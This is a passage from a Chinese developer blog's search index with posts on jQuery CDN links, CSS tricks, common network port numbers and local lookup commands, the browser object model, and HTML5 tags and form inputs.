jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.4.4.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.4.4.zipjquery-1.4.2百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.4.2/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.4.2.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.4.2.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.4.2.zipjquery-1.3.2百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.3.2/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.3.2.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.3.2.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.3.2.zipjquery-1.2.3百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.2.3/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.2.3.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.2.3.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.2.3.zip]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS 的一些冷知识]]></title>
    <url>%2Farchives%2F263bbb8c.html</url>
    <content type="text"><![CDATA[记录常用而不易于记忆的 css 自定义代码常见实用技巧/*禁止长按链接与图片弹出菜单*/ a, img { -webkit-touch-callout: none; } /*禁止ios和android用户选中文字*/ html, body { -webkit-user-select: none; user-select: none; } /*改变输入框placeholder的颜色值*/ ::-webkit-input-placeholder { /* WebKit browsers */ color: #999; } :-moz-placeholder { /* Mozilla Firefox 4 to 18 */ color: #999; } ::-moz-placeholder { /* Mozilla Firefox 19+ */ color: #999; } :-ms-input-placeholder { /* Internet Explorer 10+ */ color: #999; } input:focus::-webkit-input-placeholder { color: #999; } /*android上去掉语音输入按钮*/ input::-webkit-input-speech-button { display: none; } /* 消除 transition 闪屏 */ .css { -webkit-transform-style: preserve-3d; -webkit-backface-visibility: hidden; -webkit-perspective: 1000; } placeholder在 input 标签中设置 placeholder 属性时, 有时候因为需求, 要修改占位符的默认颜色或者字体大小, 这是就可以用下面的 css , For Example:/* firefox */ input::-moz-placeholder { color: red; font-size: 18px; } /* IE */ input:-ms-input-placeholder { color: red; font-size: 18px; } /* chrome */ input::-webkit-input-placeholder { color: red; font-size: 18px; } 需要注意的是不同浏览器写法不同：都要加上各自浏览器的前缀(如 -webkit- )firefox 的 placeholder 的前面没有 input-firefox 与 chrome 都是 :: 两个冒号, 而 IE 则是一个 :低版本的浏览器与新版本浏览器可能写法不同下拉框的小三角select 标签会出现小三角, 通常这个小三角都会去掉, 或者用背景图片的方式替换为符合要求的样子。 去掉小三角的 css , For Example:select { -webkit-appearance: none;/* chrome */ -moz-appearance: none;/* firefox */ /* 在IE浏览器中目前还没找到可以去掉小三角的方法。 */ } input[type=number] 右边的 spinnersnput[type=number] 通常用在移动端设备上, 浏览器会识别 number 输入类型, 然后改变数字键盘来适应它。 但是它会出现 spinners , 一般不需要它。 去掉 spinners 的 css 如下：/* firefox */ input[type=&quot;number&quot;] { -moz-appearance: textfield; } /* chrome */ input[type=&quot;number&quot;]::-webkit-inner-spin-button, input[type=&quot;number&quot;]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; } -webkit-tap-highlight-color在移动端浏览器上(如微信、 QQ 内置浏览器), 当你点击一个链接或者通过 JavaScript 定义的可点击元素的时候, 会出现蓝色边框, 我是很讨厌这个边框的, 所以一般会这样去除, For Example:a, button, input, textarea { -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-user-modify: read-write-plaintext-only;//-webkit-user-modify有个副作用, 就是输入法不再能够输入多个字符 } /*也可以..., 简单粗暴*/ * { -webkit-tap-highlight-color: rgba(0, 0, 0, 0); } 将高亮色设为透明, 这样就看不到蓝色边框了。滚动条webkit 现在支持拥有 overflow 属性的区域, 列表框 , 下拉菜单 , textarea 的滚动条自定义样式。 有时候需要把滚动条去掉, 特别是页面中出现几条滚动条的时候, For Example:::-webkit-scrollbar { width: 0;/* 这将去除整个页面的滚动条 */ } 设置滚动条的宽度为 0 就可以去除滚动条了。文字换行For Example:.text-warp { /* 强制不换行 */ white-space: nowrap; /* 自动换行 */ word-wrap: break-word; word-break: normal; /* 强制英文单词断行 */ word-break: break-all; } 文字两端对齐For Example:.text-justify { text-align: justify; text-justify: inter-ideogra; } 去掉色焦点框去掉 Webkit(chrome) 浏览器中 input(文本框) 或 textarea 的黄色焦点框, For Example:input, button, select, textarea { outline: none; } textarea { font-size: 13px; resize: none; } 去掉黄色背景chrome 表单自动填充后, input 文本框的背景会变成黄色的, 通过审查元素可以看到这是由于 chrome 会默认给自动填充的 input 表单加上 input:-webkit-autofill 私有属性, 然后对其赋予以下样式：For Example:input: -webkit-autofill { background-color: #faffbd; background-image: none; color: #000; } 在有些情况下, 这个黄色的背景会影响到我们界面的效果。 解决方法请往下看。让 input 文本框是纯色背景的可以对 input:-webkit-autofill 使用足够大的纯色内阴影来覆盖 input 输入框的黄色背景, For Example:input: -webkit-autofill { -webkit-box-shadow: 0 0 0 1000 white inset; border: 1px solid #ccc !important; } 如果你有使用圆角等属性, 或者发现输入框的长度高度不太对, 可以对其进行调整, 除了 chrome 默认定义的 background-color , background-image , color 不能用 !important 提升其优先级以外, 其他的属性均可使用 !important 提升其优先级, For Example:input: -webkit-autofill { -webkit-box-shadow: 0 0 0 1000 white inset; border: 1px solid #ccc !important; height: 27px !important; line-height: 27px !important; border-radius: 0 4px 4px 0; } input 文本框是使用图片作为背景的这个比较麻烦, 目前还没找到完美的解决方法, 有两种选择：如果你的图片背景不太复杂, 只有一些简单的内阴影, 那个人觉得完全可以使用上面介绍的方法用足够大的纯色内阴影去覆盖掉黄色背景, 此时只不过是没有了原来的内阴影效果罢了。如果你实在想留住原来的内阴影效果, 那就只能牺牲 chrome 自动填充表单的功能, 使用 JavaScript 去实现, For Example:$(function() { if (navigator.userAgent.toLowerCase().indexOf(&quot;chrome&quot;) &gt;= 0) { $(window).load(function() { $(&quot;ul input:not(input[type=submit])&quot;).each(function() { var outHtml = this.outerHTML; $(this).append(outHtml); }); }); } }); 关闭自动填充表单功能如果你既不想使用 JavaScript , 也不想用 css , 好吧, 在 form 标签上直接关闭了表单的自动填充功能： autocomplete=&quot;off&quot; 。 For Example:&lt;from action=&quot;&quot; autocomplete=&quot;off&quot;&gt; ... &lt;/from&gt; seperate-tableFor Example:.tab { border-collapse: separate; border: 1px solid #e0e0e0; } .tab th, .tab td { padding: 3px; font-size: 12px; background: #f5f9fb; border: 1px solid; border-color: #fff #deedf6 #deedf6 #fff; } .tab th { background: #edf4f0; } .tab tr.even td { background: #fff; } For Example:&lt;table class=&quot;tab&quot; width=&quot;100%&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot;&gt; &lt;tr&gt; &lt;th&gt;111&lt;/th&gt; &lt;td&gt;222&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;111&lt;/th&gt; &lt;td&gt;222&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; codepen 调试地址清除浮动, 万能的 float 闭合给需要闭合的 DIV（class 为 clearfix） 加上如下的 CSS 样式即可, For Example:.clearfix:after { content: &quot;.&quot;; display: block; height: 0; clear: both; visibility: hidden; } *html .clearfix { height: 1%; } * + html .clearfix { height: 1%; } .clearfix { display: inline-block; } .clearfix { display: block; } 不过貌似这样有点麻烦, 呵呵, 大前端常用的是下面的, For Example:.clear { clear: both; height: 0; overflow: hidden; } 上诉办法是在需要清除浮动的地方加个 div.clear 或者 br.clear, 我们知道这样能解决基本清浮动问题。 但是这种方法的最大缺陷就是改变了 html 结构, 虽然只是加个 div]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>Code</tag>
        <tag>Layout</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的端口号以及其对应的应用程序或服务]]></title>
    <url>%2Farchives%2Fb2502458.html</url>
    <content type="text"><![CDATA[列出 TCP/UDP 协议常见的端口号占用情况, 以助于分析该服务器开放了哪些端口号, 或者程序占用了哪些端口号如何查看Windows 系统通过 netstat 列出所有端口的使用情况, For Example:netstat -ano 通过 findstr 查询包含关键字的端口使用情况, For Example:netsata -ano | findstr &quot;:80&quot; 通过 tasklist 查询哪个程序或应用占用该端口对应的 PID , For Example:tasklist | findstr &quot;2180&quot; Windows 系统除了通过命令查询外, 通过任务管理器也可查询进程的 PID 以及其占用情况。Liunx 系统通过 netstat 列出监听的端口, For Example:netstat -tlun 通过 netstat 列出所有的网络连接, For Example:netstat -an 通过 ps 查看进程占用状态, For Example:ps -ef | grep sshd 通过工具扫描常见端口号TCP 协议相关20 =&gt; FTP（文件传输协议） 传输数据端口, 用于纯属数据21 =&gt; FTP（文件传输协议） 连接端口, 用于登陆认证22 =&gt; SSH（安全外壳协议） 加密的远程连接, SFTP（安全的文件传输协议） 传输安全的数据23 =&gt; Telnet（远程终端协议） 相对不安全的远程连接25 =&gt; SMTP（简单邮件传输协议） 使用的端口53 =&gt; DNS 服务器开放的端口, 入侵者可能是试图进行区域传递（TCP）, 所以防火墙常常过滤或记录该端口80 / 8080 / 3128 / 8081 / 9080 =&gt; HTTP（超文本传输协议） 使用的端口109 =&gt; POP2（邮件协议 2） 服务器开放的端口110 =&gt; POP3（邮件协议 3） 服务器开放的端口, 用于接收邮件, 客户端访问服务器的邮件服务139 =&gt; 文件共享使用的端口443 =&gt; HTTPS（安全套接字层的超文本传输协议） 默认端口, 传输数据更加安全445 =&gt; SMB（文件共享服务）开放的端口1433 =&gt; SQL Server 默认的端口, 用于供 SQL Server 对外提供服务1521 =&gt; Oracle 数据库默认端口3306 =&gt; MySQL 数据库默认端口3389 =&gt; 远程桌面使用的端口8080 =&gt; Tomcat 服务器的默认端口UDP 协议相关53 =&gt; DNS 服务器开放的端口, 入侵者可能是试图进行欺骗 DNS（UDP）或隐藏其他的通信, 所以防火墙常常过滤或记录该端口69 =&gt; TFTP（简单文件传输协议） 默认的端口号139 =&gt; 文件共享使用的端口161 =&gt; SNMP（简单网络管理协议） 入侵者常探测的端口162 =&gt; SNMP（简单网络管理协议） 默认的端口号445 =&gt; SMB（文件共享服务）开放的端口1434 =&gt; SQL Server 默认的端口, 于向请求者返回 SQL Server 使用了哪个 TCP/IP 端口更多请下载文档查看请下载查看 常见 TCP 和 UDP 端口列表.doc]]></content>
      <categories>
        <category>networking</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Network</tag>
        <tag>Windows</tag>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器对象模型]]></title>
    <url>%2Farchives%2F8852f7a3.html</url>
    <content type="text"><![CDATA[BOM (Browser Object Model) 是指浏览器对象模型, 是用于描述这种对象与对象之间层次关系的模型BOM 的定义BOM 是 browser object model 的缩写, 简称浏览器对象模型BOM 提供了独立于内容而与浏览器窗口进行交互的对象由于 BOM 主要用于管理窗口与窗口之间的通讯, 因此其核心对象是 windowBOM 由一系列相关的对象构成, 并且每个对象都提供了很多方法与属性BOM 缺乏标准, JavaScript 语法的标准化组织是 ECMA , DOM 的标准化组织是 W3CBOM 最初是 Netscape 浏览器标准的一部分BOM 的结构图在线查看 browser-object-model.jpg请下载查看 browser-object-model.jpgBOM 和 DOM 的不同之处BOM 即浏览器对象模型, 主要用了访问一些和网页无关的浏览器功能。 如： window 、 location 、 navigator 、 screen 、 history 等对象。DOM 即文档对象模型, 针对 HTML （或 XML ）文档的 API （应用程序编程接口）。 描绘的一个层次化的节点树, 开发人员可以添加、 修改和删除页面的某一部分。细说 BOM 对象window 对象window 对象表示浏览器的一个实例, 同时也是 ECMAScript 规定的 Global 对象。 （Global： 所有在全局作用域中定义的属性和函数, 都是 Global 对象的属性。 在浏览器中 Global 对象实际上就是 window 对象实现的 ） 全局作用域( 所有全局对象都可以通过 window 来访问 )For Example:var str = &quot;张三&quot;; function fun() { alert(str); } // 全局对象都可以通过 window 的属性方式来访问 alert(window.str); window.fun(); 弹出窗口For Example:window.open(&quot;https://www.baidu.com&quot;, &quot;NewWin&quot;, &quot;height=400, width=400&quot;); 第三个参数还可能有的值如：间歇调用（setTimeout）For Example:setTimeout(function() { alert(&quot;Hello world!&quot;); }, 1000);// 会在 1000 毫秒后执行 如果在间歇时间之前想要取消执行, 我们可以 clearTimeout() , For Example:// 设置超时调用 var timeoutId = setTimeout(function() { alert(&quot;Hello world!&quot;); }, 1000); //注意： 把它取消 clearTimeout(timeoutId); 同样我们也可以通过间歇调用模拟实现超时调用, For Example:function fun() { // 这里可以实现某些逻辑 setTimeout(fun(), 100); } fun(); 超时调用（setInterval）For Example:setInterval(function() { alert(&quot;Hello world!&quot;); }, 1000);// 每隔 1 秒 执行一遍 如果想要取消执行, 我们可以 clearTimeout() , For Example:var i = 1; var timeId = setInterval(function() { i++; // 这里可以执行某些逻辑 if (1 &gt;= 100) { clearInterval(timeId);// 注意和取消间歇调用不一样（clearTimeout） } }, 1000);// 每隔1秒 执行一遍 location 对象location 对象说来也是奇怪, 它既是 window 的属性也是 document 属性, 且同时指向了同一个对象。 window 和 document 的关系： 浏览器中的 html 成为了 document 对象, 使我们可以通过 javascript 来访问、 操作 html 的元素。 且 documnet 对象是 window 对象的一部分, 可以通过 window.document 属性来访问。location 的属性属性名例子说明hash“#contens”返回 URL 中 hash（#号后跟零或多个字符）, 如果 URL 中不包含散列, 则返回空字符串host“www.baidu.com:80”返回服务器名和端口号hostname“www.baidu.com”返回不带端口号的服务器名称href“http://www.baidu.com“返回当前加载页面的完整 URL。 location 对象的 toString() 方法也返回该值pathname“/admin/“返回 URL 中的目录或文件名port“8080”返回 URL 中指定的端口号, 如果 URL 中不包含端口号, 则返回空字符串protocol“http\:”返回页面使用的协议。 通常是 http\: 或者是 https\:search“?q=javascript&amp;&amp;tags=web”返回 URL 中查询的字符串。 查询以 ？ 与前面的字符串分割, 用 &amp;&amp; 连接多个类型的查询有了上面这些属性, 我们可以非常方便的修改 url , For Example:// 假设初始 URL 为 http://www.wrox.com/WileyCDA/ // 将 URL 修改为 &quot;http://www.wrox.com/WileyCDA/#section1&quot; location.hash = &quot;#section1&quot;; // 将 URL 修改为 &quot;http://www.wrox.com/WileyCDA/?q=javascript&quot; location.search = &quot;?q=javascript&quot;; // 将 URL 修改为 &quot;https://www.yahoo.com/WileyCDA/&quot; location.hostname = &quot;www.yahoo.com&quot;; // 将 URL 修改为 &quot;https://www.yahoo.com/mydir/&quot; location.pathname = &quot;mydir&quot;; // 将 URL 修改为 &quot;https://www.yahoo.com:8080/WileyCDA/&quot; location.port = 8080; 每次修改 location 的属性（ hash 除外）, 页面都会以新 URL 重新加载。 也就是说, 浏览器会生成一天后退的历史记录。 如果我们不想能够回退可以使用 replace（） 方法, For Example:location.replace(&quot;https://www.baidu.com&quot;);// 如此就不会有回退记录了。 除了 replace 方法外还有个比较重要的方法。 reload 方法用来刷新。location.reload();// 重新加载（有可能从缓存中加载） location.reload(true);// 重新加载（从服务器重新加载）也就是强制刷新 navigator 对象、 screen 对象navigator 对象主要用来识别客户端浏览器, 但是由于各类浏览器对 navigator 对象的实现各有不同, 这里就不细分析了。 screen 对象基本上只用来表明客户端的能力, 其中包括浏览器窗口外部的显示器的信息, 如像素宽度和高度等。 每种浏览器对其的支持程度也是不同的, 这里也不分析了。history 对象history 对象主要保存当前也网页的历史记录。 但出于安全考虑, 程序员不能够知道详细的 url。For Example:history.length;// 历史记录的数量 history.back();// 后退一页 history.forward();// 前进一页 history.go(-1);// 后退一页 history.go(1);// 前进一页 history.go(2);// 前进两页 history.go(&quot;wrox.com&quot;);// 跳转到最近的 wrox.com 页面]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Pentest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5 的一些冷知识]]></title>
    <url>%2Farchives%2Fba82b422.html</url>
    <content type="text"><![CDATA[现已进入了 HTML5 时代,这些知识在前端开发人员眼里也就变得更加重要HTML5 带来的好处关于新标记和语义的价值的讨论已经很多,有些人认为这些语义以及可视化表现方式没有任何意义。因为它们带来的是更复杂的代码,创造了使用这些新 HTML 代码犯新错误的机会,HTML5 新语义的价值在于提升了网站用户和这些技术之间的交互和协作的水平,这是使互联网前进的原因。同样的道理,我们应该明白,就像 HTML5 给我们的感觉是那样酷一样,人们在其上付出了很多的努力,对未来 5 年互联网的发展寄予厚望。 今天,这些新标记和语义看起来的确是很棒,我们都很喜欢,但别忘了,任何东西都是在不断变化着来适应人们的需求,新的语言特征必须依赖于人们的使用,互联网社区的大量使用,只有这样才能使单纯的新事物变成有用的新事物。安利一个在线神器快速生成标准的 HTML5 文档。initializr,国内访问比较慢,需要翻墙文档类型和编码HTML5 文档类型很简单&lt;!doctype html&gt; HTML5 使用 UTF-8 编码&lt;meta charset=&quot;UTF-8&quot;&gt; HTML5 新增元素新标签article =&gt; 定义一篇文章aside =&gt; 定义页面内容部分的侧边栏audio =&gt; 定义音频内容canvas =&gt; HTML5 画布command =&gt; 定义一个命令按钮datalist =&gt; 定义一个下拉列表details =&gt; 定义一个元素的详细内容dialog =&gt; 定义一个对话框(会话框)embed =&gt; 定义外部的可交互的内容或插件figure =&gt; 定义一组媒体内容以及它们的标题figcaption =&gt; figure 的标题footer =&gt; 定义一个页面或一个区域的底部header =&gt; 定义一个页面或一个区域的头部hgroup =&gt; 定义文件中一个区块的相关信息keygen =&gt; 定义表单里一个生成的键值mark =&gt; 定义有标记的文本meter =&gt; 定义度量衡,仅用于已知最大和最小值的度量nav =&gt; 定义导航链接output =&gt; 定义一些输出类型progress =&gt; 定义任务的过程rp =&gt; 在 ruby 注释中使用,以定义不支持 ruby 元素的浏览器所显示的内容,ruby 注释是中文注音或字符rt =&gt; 定义字符（中文注音或字符）的解释或发音,ruby 注释是中文注音或字符ruby =&gt; 定义 ruby 注释（中文注音或字符）section =&gt; 定义一个区域source =&gt; 定义媒体资源time =&gt; 定义一个日期或者时间video =&gt; 定义一个视频一个简单的实例&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;header&gt; &lt;h1&gt;Header in h1&lt;/h1&gt; &lt;h2&gt;Subheader in h2&lt;/h2&gt; &lt;/header&gt; &lt;nav&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Menu Option 1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Menu Option 2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Menu Option 3&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;section&gt; &lt;article&gt; &lt;header&gt; &lt;h1&gt;Article #1&lt;/h1&gt; &lt;/header&gt; &lt;section&gt; This is the first article. This is &lt;mark&gt;highlighted&lt;/mark&gt;. &lt;/section&gt; &lt;/article&gt; &lt;article&gt; &lt;header&gt; &lt;h1&gt;Article #2&lt;/h1&gt; &lt;/header&gt; &lt;section&gt; This is the second article. These articles could be blog posts, etc. &lt;/section&gt; &lt;/article&gt; &lt;/section&gt; &lt;aside&gt; &lt;section&gt; &lt;h1&gt;Links&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Link 1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Link 2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Link 3&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/section&gt; &lt;figure&gt; &lt;img width=&quot;150&quot; height=&quot;auto&quot; src=&quot;https://www.baidu.com/img/bd_logo1.png&quot; alt=&quot;baidu logo&quot; /&gt; &lt;figcaption&gt;baidu logo&lt;/figcaption&gt; &lt;/figure&gt; &lt;/aside&gt; &lt;footer&gt;Footer - Copyright &lt;time&gt;2016&lt;/time&gt;&lt;/footer&gt; &lt;/body&gt; &lt;/html&gt; 表单新元素、类型datalist =&gt; 数据列表datetime =&gt; 手工输入完整的时间datetime-local =&gt; 含日期（年月日）和时间output =&gt; 输出一个算法或脚本执行的结果keygen =&gt; 为数据生成一对密钥（公钥和私钥）,当提交表单时,私钥存储在本地,公钥发送到服务器。date =&gt; 只含年月日的日期month =&gt; 只含年月的日期week =&gt; 只含年、周的日期time =&gt; 选择时间color =&gt; 颜色选择器number =&gt; 只能输入数字,移动端会弹出数字键盘range =&gt; 一个固定范围内的数字email =&gt; 只能输入邮箱地址,移动端会弹出英文键盘url =&gt; 只能输入 URL 网址,移动端会弹出英文键盘tel =&gt; 只能输入电话号码,移动端会弹出数字键盘search =&gt; 搜索内容框,移动端会弹出英文键盘一个简单的实例&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div&gt; &lt;input id=&quot;myCar&quot; list=&quot;cars&quot; type=&quot;text&quot;&gt; &lt;datalist id=&quot;cars&quot;&gt; &lt;option value=&quot;BMW&quot;&gt; &lt;option value=&quot;Ford&quot;&gt; &lt;option value=&quot;Volvo&quot;&gt; &lt;/datalist&gt; &lt;/div&gt; &lt;div&gt;&lt;input type=&quot;datatime&quot; value=&quot;2016-08-15T10:50Z&quot;&gt;&lt;/div&gt; &lt;div&gt; &lt;div&gt;Username: &lt;input type=&quot;text&quot; name=&quot;usr_name&quot;&gt;&lt;/div&gt; &lt;div&gt;Encryption: &lt;keygen name=&quot;security&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div&gt;&lt;input type=&quot;date&quot;&gt;&lt;/div&gt; &lt;div&gt;&lt;input type=&quot;month&quot;&gt;&lt;/div&gt; &lt;div&gt;&lt;input type=&quot;week&quot;&gt;&lt;/div&gt; &lt;div&gt;&lt;input type=&quot;time&quot;&gt;&lt;/div&gt; &lt;div&gt;&lt;input type=&quot;datetime-local&quot;&gt;&lt;/div&gt; &lt;div&gt;&lt;input type=&quot;search&quot; value=&quot;百度一下,你就知道&quot;&gt;&lt;/div&gt; &lt;div&gt;&lt;input type=&quot;color&quot;&gt;&lt;/div&gt; &lt;div&gt;&lt;input type=&quot;email&quot; value=&quot;666666@qq.com&quot;&gt;&lt;/div&gt; &lt;div&gt;&lt;input type=&quot;url&quot; value=&quot;https://vxhly.github.io&quot;&gt;&lt;/div&gt; &lt;div&gt;&lt;input type=&quot;tel&quot; value=&quot;800820820&quot;&gt;&lt;/div&gt; &lt;div&gt;&lt;button type=&quot;submit&quot;&gt;submit&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button type=&quot;reset&quot;&gt;reset&lt;/button&gt;&lt;/div&gt; &lt;/form&gt; &lt;form oninput=&quot;x.value=parseInt(a.value)+parseInt(b.value)&quot;&gt; 0 &lt;input type=&quot;range&quot; id=&quot;a&quot; value=&quot;50&quot;&gt; 100 + &lt;input type=&quot;number&quot; id=&quot;b&quot; value=&quot;50&quot;&gt; = &lt;output name=&quot;x&quot; for=&quot;a b&quot;&gt;&lt;/output&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; HTML5 废弃的内容HTML5 废弃了一些过时的,不合理的 HTML 标签acronymcenterdirfontsstrikettuframeframesetnoframeappletbigcenterbasefront打电话发短信写邮件打电话&lt;a href=&quot;tel:010-88888&quot;&gt;打电话给:010-88888&lt;/a&gt; 发短信&lt;a href=&quot;sms:88888&quot;&gt;发短信给: 88888&lt;/a&gt; 写邮件&lt;!-- 注：在添加这些功能时,第一个功能以&quot;?&quot;开头,后面的以&quot;&amp;&quot;开头 --&gt; &lt;!-- 1.普通邮件 --&gt; &lt;a href=&quot;mailto:haha@wtf.com&quot;&gt;快来点我啊,给你发种子。&lt;/a&gt; &lt;!-- 2.收件地址后添加?cc=开头,可添加抄送地址（Android存在兼容问题） --&gt; &lt;a href=&quot;mailto:haha@wtf.com?cc=666@wtf.com&quot;&gt;快来点我啊,给你发种子。&lt;/a&gt; &lt;!-- 3.跟着抄送地址后,写上&amp;bcc=,可添加密件抄送地址（Android存在兼容问题） --&gt; &lt;a href=&quot;mailto:haha@wtf.com?cc=666@wtf.com&amp;bcc=384900096@wtf.com&quot;&gt;快来点我啊,给你发种子。&lt;/a&gt; &lt;!-- 4.包含多个收件人、抄送、密件抄送人,用分号(;)隔开多个邮件人的地址 --&gt; &lt;a href=&quot;mailto:haha@wtf.com;384900096@wtf.com&quot;&gt;快来点我啊,给你发种子。&lt;/a&gt; &lt;!-- 5.包含主题,用?subject= --&gt; &lt;a href=&quot;mailto:haha@wtf.com?subject=邮件主题&quot;&gt;快来点我啊,给你发种子。&lt;/a&gt; &lt;!-- 6.包含内容,用?body=;如内容包含文本,使用%0A给文本换行 --&gt; &lt;a href=&quot;mailto:haha@wtf.com?body=邮件主题内容%0A我是第二行内容%0A你没有猜错,这是我是第三行。&quot;&gt;快来点我啊,给你发种子。&lt;/a&gt; &lt;!-- 7.内容包含链接,含http(s)://等的文本自动转化为链接 --&gt; &lt;a href=&quot;mailto:haha@wtf.com?body=//www.wtf.com&quot;&gt;快来点我啊,给你发种子。&lt;/a&gt; &lt;!-- 8.内容包含图片（PC不支持） --&gt; &lt;a href=&quot;mailto:haha@wtf.com?body=&lt;img src=&#39;images/torrent.jpg&#39; /&gt;&quot;&gt;快来点我啊,给你发种子。&lt;/a&gt; 取消英文首字母的默认大写&lt;input autocapitalize=&quot;off&quot; autocorrect=&quot;off&quot; /&gt; 屏幕旋转的事件和样式function orientInit() { var orientChk = document.documentElement.clientWidth &gt; document.documentElement.clientHeight ? &quot;landscape&quot; : &quot;portrait&quot;; if (orientChk == &quot;lapdscape&quot;) { //横屏下需要执行代码 } else { //竖屏下需要执行代码 } } orientInit(); window.addEventListener( &quot;onorientationchange&quot; in window ? &quot;orientationchange&quot; : &quot;resize&quot;, function() { setTimeout(orientInit, 100); }, false ); /*竖屏时样式*/ @media all and (orientation: portrait) { } /*横屏时样式*/ @media all and (orientation: landscape) { } HTML5 多媒体标签嵌入音频HTML5 支持 MP3、Wav 和 Ogg 格式的音频,下面是在网页中嵌入音频的简单示例。&lt;audio controls&gt; &lt;source src=&quot;jamshed.mp3&quot; type=&quot;audio/mpeg&quot;&gt; Your browser does’nt support audio embedding feature. &lt;/audio&gt; 嵌入视频HTML5 支持 MP4、WebM 和 Ogg 格式的视频,下面是在网页中嵌入视频的简单示例。&lt;video width=&quot;450&quot; height=&quot;340&quot; controls&gt; &lt;source src=&quot;jamshed.mp4&quot; type=&quot;video/mp4&quot;&gt; Your browser does’nt support video embedding feature. &lt;/video&gt; 其他标签HTML5 对于多媒体提供了强有力的支持,除了 audio 和 video 标签外,还支持以下标签：embed 标签定义嵌入的内容,比如插件。&lt;embed type=&quot;video/quicktime&quot; src=&quot;Fishing.mov&quot;&gt; source 标签对于定义多个数据源很有用,解决音频/视频在不同浏览器的解析问题。&lt;video width=&quot;450&quot; height=&quot;340&quot; controls&gt; &lt;source src=&quot;jamshed.mp4&quot; type=&quot;video/mp4&quot;&gt; &lt;source src=&quot;jamshed.ogg&quot; type=&quot;video/ogg&quot;&gt; &lt;/video&gt; track 标签为诸如 video 元素之类的媒介规定外部文本轨道。 用于规定字幕文件或其他包含文本的文件,当媒介播放时,这些文件是可见的。&lt;video width=&quot;450&quot; height=&quot;340&quot; controls&gt; &lt;source src=&quot;jamshed.mp4&quot; type=&quot;video/mp4&quot;&gt; &lt;source src=&quot;jamshed.ogg&quot; type=&quot;video/ogg&quot;&gt; &lt;track kind=&quot;subtitles&quot; label=&quot;English&quot; src=&quot;jamshed_en.vtt&quot; srclang=&quot;en&quot; default&gt;&lt;/track&gt; &lt;track kind=&quot;subtitles&quot; label=&quot;Arabic&quot; src=&quot;jamshed_ar.vtt&quot; srclang=&quot;ar&quot;&gt;&lt;/track&gt; &lt;/video&gt; 播放视频不全屏&lt;!-- 1.ios7+支持自动播放 2.支持Airplay的设备（如：音箱、Apple TV)播放 x-webkit-airplay=&quot;true&quot; 3.播放视频不全屏 webkit-playsinline=&quot;true&quot; --&gt; &lt;video x-webkit-airplay=&quot;true&quot; webkit-playsinline=&quot;true&quot; preload=&quot;auto&quot; autoplay src=&quot;http://[IP]&quot;&gt;&lt;/video&gt; 利用 canvas 绘制图形Canvas 元素用于在网页上绘制图形,该元素标签强大之处在于可以直接在 HTML 上进行图形操作。 利用 Canvas 元素绘制图形,需要 JavaScript 脚本的支持,所以 JavaScript 编程能力不是很好的童鞋不要轻易尝试编写,还是去网上复制粘帖吧！&lt;canvas id=&quot;canvas1&quot; width=&quot;300&quot; height=&quot;100&quot;&gt; &lt;/canvas&gt; HTML5 存储类型HTML5 能够本地存储数据,在之前都是使用 